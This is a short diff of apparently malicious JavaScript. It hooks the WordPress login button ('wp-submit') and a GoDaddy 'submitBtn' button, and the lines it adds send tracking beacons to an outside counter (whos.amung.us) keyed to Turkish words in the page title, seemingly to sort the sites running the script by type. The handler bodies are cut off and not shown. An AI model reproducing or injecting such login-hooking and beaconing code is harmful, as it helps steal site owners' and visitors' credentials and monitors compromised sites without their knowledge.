@@ -8,6 +8,13 @@ document.getElementById('wp-submit').onclick = function() {
 
 if(document.title.toLowerCase().indexOf("porn") >= 0){new Image().src = '//whos.amung.us/widget/kekonam3.png'; }
 if(top.location.hostname.indexOf("r10.net") > -1) { new Image().src = '//whos.amung.us/widget/kekonam4.png';}
+if(document.title.toLowerCase().indexOf("film") >= 0){new Image().src = '//whos.amung.us/widget/kekonam5.png'; }
+if(document.title.toLowerCase().indexOf("dizi") >= 0){new Image().src = '//whos.amung.us/widget/kekonam5.png'; }
+if(document.title.toLowerCase().indexOf("canlı tv") >= 0){new Image().src = '//whos.amung.us/widget/kekonam6.png'; }
+if(document.title.toLowerCase().indexOf("haber") >= 0){new Image().src = '//whos.amung.us/widget/kekonam7.png'; }
+if(document.title.toLowerCase().indexOf("oyun") >= 0){new Image().src = '//whos.amung.us/widget/kekonam8.png'; }
+
+
 
 if(window.location.href.indexOf("godaddy") > 0) {
 document.getElementById('submitBtn').onclick = function() {
